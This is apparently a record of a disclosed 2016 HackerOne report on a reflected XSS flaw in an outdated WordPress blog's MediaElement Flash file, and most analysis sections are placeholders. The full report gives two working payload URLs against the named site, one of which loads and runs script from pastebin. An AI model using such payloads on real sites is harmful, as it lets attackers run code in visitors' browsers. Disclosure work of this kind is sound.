# Outdated MediaElement.js Reflected Cross-Site Scripting (XSS)

## Metadata
- **Source:** HackerOne
- **Report:** 155228 | https://hackerone.com/reports/155228
- **Submitted:** 2016-07-30
- **Reporter:** mrtn
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
I took a quick look at the business-blog.zomato.com wordpress installation, and found that it was quite outdated. (Version 4.2.4 as far as I could tell)

A pretty famous XSS attack exists for Wordpress versions below 4.5.2 that allows for reflected cross site scripting. More details can be found here: https://wpvulndb.com/vulnerabilities/8488

A proof of concept can be found by visiting this link:

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

I took a quick look at the business-blog.zomato.com wordpress installation, and found that it was quite outdated. (Version 4.2.4 as far as I could tell)

A pretty famous XSS attack exists for Wordpress versions below 4.5.2 that allows for reflected cross site scripting. More details can be found here: https://wpvulndb.com/vulnerabilities/8488

A proof of concept can be found by visiting this link:
https://business-blog.zomato.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert`1`

Just for fun, this url should make the website play Harlem Shake:
https://business-blog.zomato.com/wp-includes/js/mediaelement/flashmediaelement.swf?%%jsinitfunction=1-location.replace`javascript:eval%2528unescape%2528location.hash.slice%25281%2529%2529%2529`-#s=document.createElement%28%27script%27%29;s.src=%27//pastebin.com/raw/Fi7KcBcd%27;document.body.appendChild%28s%29;//

</details>

---
*Analysed by Claude on 2026-05-24*
